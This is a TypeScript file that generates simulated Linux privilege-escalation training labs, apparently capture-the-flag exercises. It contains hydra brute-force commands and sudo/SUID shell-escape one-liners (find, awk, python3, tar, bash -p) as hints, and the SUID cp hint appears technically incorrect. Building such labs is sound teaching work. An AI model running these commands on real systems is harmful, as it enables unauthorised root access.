import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

interface PrivescConfig {
  id: string;
  title: string;
  ip: string;
  hostname: string;
  os: string;
  company: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  footholdKind: 'ftp' | 'ssh-hydra';
  user: string;
  password: string;
  privescKind: 'sudo' | 'suid';
  binary: string;
  binaryName: string;
  gtfobinsArgs: string;
  userFlag: string;
  rootFlag: string;
}

const WORDLIST = '123456\npassword\nletmein\nadmin123\nsummer2024\nqwerty\ndragon\ntrustno1\n';

function makePrivescLab(cfg: PrivescConfig): LabScenario {
  const services: HostDef['services'] =
    cfg.footholdKind === 'ftp'
      ? [
          { port: 21, name: 'ftp', version: 'vsftpd 3.0.3', banner: 'vsftpd 3.0.3 ready', ftpAnonymous: true },
          { port: 22, name: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu-4ubuntu0.5' },
        ]
      : [
          { port: 22, name: 'ssh', version: 'OpenSSH 8.4p1 Debian-5' },
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.18.0',
            http: {
              '/': `<html><body><h1>${cfg.company} — Internal</h1></body></html>`,
              '/robots.txt': `User-agent: *\nDisallow: /internal-${cfg.user}-notes\n`,
            },
          },
        ];

  const suidNode =
    cfg.privescKind === 'suid'
      ? { [cfg.binaryName]: file(`ELF binary (SUID root)\n`, '-rwsr-xr-x') }
      : {};

  const homeDir = dir({
    [cfg.user]: dir({
      'user.txt': file(
        `Foothold established on ${cfg.hostname}.\n${cfg.userFlag}\n`,
      ),
    }),
  });

  const host: HostDef = {
    hostname: cfg.hostname,
    ip: cfg.ip,
    os: cfg.os,
    services,
    users: [
      {
        username: cfg.user,
        password: cfg.password,
        sudo: cfg.privescKind === 'sudo' ? { nopasswdCommands: [cfg.binary] } : undefined,
      },
    ],
    suidBinary: cfg.privescKind === 'suid' ? cfg.binary : undefined,
    root: dir({
      srv:
        cfg.footholdKind === 'ftp'
          ? dir({
              ftp: dir({
                'notes.txt': file(
                  `${cfg.company} deployment notes.\nSSH access for ${cfg.user}: password is "${cfg.password}"\n`,
                ),
              }),
            })
          : dir({}),
      home: homeDir,
      usr: dir({ bin: dir(suidNode) }),
      root: dir({ 'root.txt': file(`Root compromise via ${cfg.privescKind === 'sudo' ? 'sudo misconfiguration' : 'SUID binary'} on '${cfg.binaryName}'.\n${cfg.rootFlag}\n`) }),
    }),
  };

  const footholdObjective =
    cfg.footholdKind === 'ftp'
      ? `Use anonymous FTP on ${cfg.ip} to find SSH credentials for "${cfg.user}"`
      : `Enumerate the web server on ${cfg.ip} (check /robots.txt) to identify the username, then brute-force the SSH password with hydra`;

  const footholdHint =
    cfg.footholdKind === 'ftp'
      ? `ftp ${cfg.ip} then ftp-get ${cfg.ip} notes.txt to read the deployment notes.`
      : `curl ${cfg.ip}/robots.txt reveals the username, then: hydra -l ${cfg.user} -P /root/wordlists/mini-rockyou.txt ssh://${cfg.ip}`;

  const privescHint =
    cfg.privescKind === 'sudo'
      ? `Run 'sudo -l' to see the NOPASSWD rule on ${cfg.binary}, then check GTFOBins for the '${cfg.binaryName}' sudo technique: sudo ${cfg.binary} ${cfg.gtfobinsArgs}`
      : `Run 'find / -perm -4000 2>/dev/null' to spot ${cfg.binary} is SUID root, then execute it directly: ${cfg.binary} ${cfg.gtfobinsArgs}`;

  return {
    id: cfg.id,
    title: cfg.title,
    difficulty: cfg.difficulty,
    category: 'Linux',
    briefing: `Target ${cfg.ip} (${cfg.hostname}) belongs to ${cfg.company}. ${footholdObjective}, then escalate to root using a ${cfg.privescKind === 'sudo' ? 'misconfigured sudo rule' : 'SUID-root binary'} on ${cfg.binaryName}.`,
    objectives: [
      `Scan ${cfg.ip} and enumerate open services`,
      footholdObjective,
      `Log in as ${cfg.user} and capture user.txt`,
      cfg.privescKind === 'sudo' ? `Run 'sudo -l' and exploit the NOPASSWD rule on ${cfg.binaryName}` : `Find and exploit the SUID bit on ${cfg.binaryName}`,
      'Capture root.txt',
    ],
    hints: [
      `nmap -sV ${cfg.ip} to start.`,
      footholdHint,
      privescHint,
      'Once root, check /root/root.txt.',
    ],
    totalFlags: 2,
    attacker: {
      hostname: 'kali',
      user: 'root',
      root: dir({ root: dir({ wordlists: dir({ 'mini-rockyou.txt': file(WORDLIST) }) }) }),
    },
    network: [host],
  };
}

export const linuxPrivescLabs: LabScenario[] = [
  makePrivescLab({
    id: 'privesc-find',
    title: 'Privesc: The find Command',
    ip: '10.10.101.1',
    hostname: 'build01',
    os: 'Ubuntu 20.04',
    company: 'Northwind Builds',
    difficulty: 'Easy',
    footholdKind: 'ftp',
    user: 'deploy',
    password: 'BuildD3ploy!',
    privescKind: 'sudo',
    binary: '/usr/bin/find',
    binaryName: 'find',
    gtfobinsArgs: '. -exec /bin/sh \\; -quit',
    userFlag: 'flag{ftp_leaked_the_deploy_creds_find}',
    rootFlag: 'flag{sudo_find_exec_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-less',
    title: 'Privesc: The less Pager',
    ip: '10.10.101.2',
    hostname: 'docs01',
    os: 'Debian 11',
    company: 'Fairbank Docs',
    difficulty: 'Easy',
    footholdKind: 'ssh-hydra',
    user: 'writer',
    password: 'sunshine1',
    privescKind: 'sudo',
    binary: '/usr/bin/less',
    binaryName: 'less',
    gtfobinsArgs: '/root/root.txt (then type !/bin/sh at the prompt)',
    userFlag: 'flag{web_leak_found_the_writer_account}',
    rootFlag: 'flag{sudo_less_shell_escape_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-awk',
    title: 'Privesc: The awk Interpreter',
    ip: '10.10.101.3',
    hostname: 'reports02',
    os: 'Ubuntu 18.04',
    company: 'Ledgerline Reports',
    difficulty: 'Easy',
    footholdKind: 'ftp',
    user: 'analyst',
    password: 'dragonfire',
    privescKind: 'sudo',
    binary: '/usr/bin/awk',
    binaryName: 'awk',
    gtfobinsArgs: `'BEGIN {system("/bin/sh")}'`,
    userFlag: 'flag{ftp_notes_gave_up_analyst_password}',
    rootFlag: 'flag{sudo_awk_system_call_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-python3',
    title: 'Privesc: The Python Interpreter',
    ip: '10.10.101.4',
    hostname: 'automate03',
    os: 'Ubuntu 22.04',
    company: 'Cascade Automation',
    difficulty: 'Medium',
    footholdKind: 'ssh-hydra',
    user: 'ops',
    password: 'trustno1',
    privescKind: 'sudo',
    binary: '/usr/bin/python3',
    binaryName: 'python3',
    gtfobinsArgs: `-c 'import os; os.system("/bin/sh")'`,
    userFlag: 'flag{robots_txt_revealed_the_ops_account}',
    rootFlag: 'flag{sudo_python3_os_system_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-nmap-sudo',
    title: 'Privesc: Nmap Interactive Mode',
    ip: '10.10.101.5',
    hostname: 'scanhost04',
    os: 'CentOS 8',
    company: 'Ferro Security',
    difficulty: 'Medium',
    footholdKind: 'ftp',
    user: 'netadmin',
    password: 'qwerty',
    privescKind: 'sudo',
    binary: '/usr/bin/nmap',
    binaryName: 'nmap',
    gtfobinsArgs: `--interactive (then: !sh)`,
    userFlag: 'flag{ftp_anon_leaked_netadmin_creds}',
    rootFlag: 'flag{sudo_nmap_interactive_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-man',
    title: 'Privesc: The man Pager',
    ip: '10.10.101.6',
    hostname: 'wiki05',
    os: 'Ubuntu 20.04',
    company: 'Harborlight Wiki',
    difficulty: 'Easy',
    footholdKind: 'ssh-hydra',
    user: 'editor',
    password: 'admin123',
    privescKind: 'sudo',
    binary: '/usr/bin/man',
    binaryName: 'man',
    gtfobinsArgs: 'man (then type !/bin/sh at the prompt)',
    userFlag: 'flag{editor_account_found_via_robots}',
    rootFlag: 'flag{sudo_man_shell_escape_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-more',
    title: 'Privesc: The more Pager',
    ip: '10.10.101.7',
    hostname: 'notes06',
    os: 'Debian 10',
    company: 'Millbrook Notes',
    difficulty: 'Easy',
    footholdKind: 'ftp',
    user: 'clerk',
    password: 'letmein',
    privescKind: 'sudo',
    binary: '/usr/bin/more',
    binaryName: 'more',
    gtfobinsArgs: '/root/root.txt (then type !/bin/sh)',
    userFlag: 'flag{ftp_notes_txt_had_clerk_password}',
    rootFlag: 'flag{sudo_more_shell_escape_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-tar',
    title: 'Privesc: The tar Archiver',
    ip: '10.10.101.8',
    hostname: 'backup07',
    os: 'Ubuntu 20.04',
    company: 'Stonegate Backups',
    difficulty: 'Medium',
    footholdKind: 'ssh-hydra',
    user: 'backupsvc',
    password: 'password',
    privescKind: 'sudo',
    binary: '/usr/bin/tar',
    binaryName: 'tar',
    gtfobinsArgs: '-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    userFlag: 'flag{backupsvc_account_found_via_web}',
    rootFlag: 'flag{sudo_tar_checkpoint_exec_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-perl',
    title: 'Privesc: The Perl Interpreter',
    ip: '10.10.101.9',
    hostname: 'legacy08',
    os: 'CentOS 7',
    company: 'Old Mill Systems',
    difficulty: 'Medium',
    footholdKind: 'ftp',
    user: 'legacyuser',
    password: 'summer2024',
    privescKind: 'sudo',
    binary: '/usr/bin/perl',
    binaryName: 'perl',
    gtfobinsArgs: `-e 'exec "/bin/sh";'`,
    userFlag: 'flag{ftp_config_leaked_legacyuser_creds}',
    rootFlag: 'flag{sudo_perl_exec_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-node',
    title: 'Privesc: The Node.js Runtime',
    ip: '10.10.101.10',
    hostname: 'apisvc09',
    os: 'Ubuntu 22.04',
    company: 'Brightline API Co.',
    difficulty: 'Medium',
    footholdKind: 'ssh-hydra',
    user: 'devops',
    password: 'dragon',
    privescKind: 'sudo',
    binary: '/usr/bin/node',
    binaryName: 'node',
    gtfobinsArgs: `-e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`,
    userFlag: 'flag{devops_creds_found_via_robots_txt}',
    rootFlag: 'flag{sudo_node_child_process_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-git',
    title: 'Privesc: Git Pager Escape',
    ip: '10.10.101.11',
    hostname: 'gitmirror10',
    os: 'Debian 11',
    company: 'Redoak Version Control',
    difficulty: 'Medium',
    footholdKind: 'ftp',
    user: 'gituser',
    password: 'trustno1',
    privescKind: 'sudo',
    binary: '/usr/bin/git',
    binaryName: 'git',
    gtfobinsArgs: '-p help config (then type !/bin/sh)',
    userFlag: 'flag{ftp_mirror_backup_leaked_gituser}',
    rootFlag: 'flag{sudo_git_pager_escape_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-suid-find',
    title: 'Privesc: SUID find Binary',
    ip: '10.10.101.12',
    hostname: 'fileserv11',
    os: 'Ubuntu 18.04',
    company: 'Ashford File Systems',
    difficulty: 'Medium',
    footholdKind: 'ssh-hydra',
    user: 'filesvc',
    password: 'admin123',
    privescKind: 'suid',
    binary: '/usr/bin/find',
    binaryName: 'find',
    gtfobinsArgs: '. -exec /bin/sh -p \\; -quit',
    userFlag: 'flag{filesvc_creds_leaked_via_web_enum}',
    rootFlag: 'flag{suid_find_direct_exec_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-suid-nmap',
    title: 'Privesc: SUID Nmap Binary',
    ip: '10.10.101.13',
    hostname: 'netscan12',
    os: 'CentOS 8',
    company: 'Ridgeline Networks',
    difficulty: 'Medium',
    footholdKind: 'ftp',
    user: 'scanner',
    password: 'qwerty',
    privescKind: 'suid',
    binary: '/usr/bin/nmap',
    binaryName: 'nmap',
    gtfobinsArgs: '--interactive (then: !sh)',
    userFlag: 'flag{ftp_config_backup_leaked_scanner_creds}',
    rootFlag: 'flag{suid_nmap_direct_exec_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-suid-bash',
    title: 'Privesc: SUID Bash Binary',
    ip: '10.10.101.14',
    hostname: 'shellhost13',
    os: 'Ubuntu 20.04',
    company: 'Kestrel Hosting',
    difficulty: 'Easy',
    footholdKind: 'ssh-hydra',
    user: 'hostops',
    password: 'password',
    privescKind: 'suid',
    binary: '/bin/bash',
    binaryName: 'bash',
    gtfobinsArgs: '-p',
    userFlag: 'flag{hostops_password_found_via_robots}',
    rootFlag: 'flag{suid_bash_dash_p_equals_root}',
  }),
  makePrivescLab({
    id: 'privesc-suid-cp',
    title: 'Privesc: SUID cp Binary',
    ip: '10.10.101.15',
    hostname: 'storage14',
    os: 'Debian 11',
    company: 'Ironvale Storage',
    difficulty: 'Hard',
    footholdKind: 'ftp',
    user: 'storageadm',
    password: 'letmein',
    privescKind: 'suid',
    binary: '/bin/cp',
    binaryName: 'cp',
    gtfobinsArgs: '/bin/bash /tmp/rootbash && /tmp/rootbash -p',
    userFlag: 'flag{ftp_deploy_notes_leaked_storageadm}',
    rootFlag: 'flag{suid_cp_overwrite_shell_equals_root}',
  }),
];
